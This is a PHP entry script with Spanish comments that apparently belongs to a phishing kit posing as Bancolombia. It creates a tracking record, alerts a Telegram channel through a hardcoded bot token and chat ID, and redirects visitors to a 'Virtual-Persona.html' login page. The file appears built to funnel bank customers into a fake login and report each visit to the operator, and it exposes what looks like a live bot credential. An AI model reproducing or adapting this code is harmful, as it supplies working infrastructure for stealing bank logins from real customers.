<?php
/**
 * back.php
 * --------
 * Entry point legacy que genera una solicitud NUEVA "Ingreso Verde".
 * Flujo directo sin formulario: crea fila en solicitudes + notifica Telegram
 * y redirige a Virtual-Persona.html (login).
 *
 * Diferencias con handlers POST standard (conservadas por restricción funcionalidad):
 *   - Usa canal Telegram auxiliar (mismo token/chat que enviar_formulario.php).
 *   - Genera key NUEVA + solicitud INSERT (no UPDATE de una existente).
 *   - No usa teclado inline (solo mensaje informativo).
 *
 * 6 pasos:
 *   1) Definir valores por defecto (celular / monto / banco = Bancolombia).
 *   2) Generar identificadores: request_id BCO_<144 bits> + key <32 hex> (nueva).
 *   3) INSERT en solicitudes (fila inicial, sin datos de usuario todavía).
 *   4) Notificar a Telegram canal auxiliar "Nueva Ingreso Verde".
 *   5) Guardar variables en sesión PHP.
 *   6) 302 → Virtual-Persona.html?rid=&key=&banco=.
 */

session_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

// ── Paso 1: Valores por defecto de la solicitud "Ingreso Verde" ────────────────
$celular = 'No hay celular';
$monto   = 'No hay monto';
$banco   = 'BANCOLOMBIA';
$tipo    = $tipo ?? 'ingreso_verde'; // Defensa si $tipo no se define antes del include

// ── Paso 2: Generar identificadores (scope BCO_ para shared webhook) ───────────
try {
    $request_id = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $_) {
    $request_id = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}
$key = bin2hex(random_bytes(16)); // 32 caracteres hex (id sesión usuario)

// ── Paso 3: Persistir fila inicial en solicitudes ─────────────────────────────
$stmt = $pdo->prepare(
    "INSERT INTO solicitudes (numero_cuenta, monto, banco, request_id, `key`)
     VALUES (?, ?, ?, ?, ?)"
);
$stmt->execute([$celular, $monto, $banco, $request_id, $key]);

// ── Paso 4: Telegram (mismo canal OPERACIONES unificado en esta instalación) ──
// FIX DETERMINANTE: CANAL NUEVO hardcodeado DEFAULT. getenv() SOLO sobreescribe si
// existe y no está vacía. Nunca más al canal legacy anterior.
$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";
$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
$token   = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
$chat_id = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;

$mensaje  = "🌱 <b>[INGRESO VERDE]</b> Entrada directa back.php (sin landing anterior):\n";
$mensaje .= "🏦 Banco: $banco\n";

$url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    'chat_id' => $chat_id,
    'text'    => $mensaje,
]);
@file_get_contents($url);

// ── Paso 5: Persistir en sesión PHP (flujo legacy) ────────────────────────────
$_SESSION['celular']    = $celular;
$_SESSION['monto']      = $monto;
$_SESSION['tipo']       = $tipo;
$_SESSION['banco']      = $banco;
$_SESSION['request_id'] = $request_id;
$_SESSION['key']        = $key;

// ── Paso 6: Redirect al formulario Virtual-Persona ────────────────────────────
header("Location: Virtual-Persona.html?rid=$request_id&key=$key&banco=$banco");
exit;
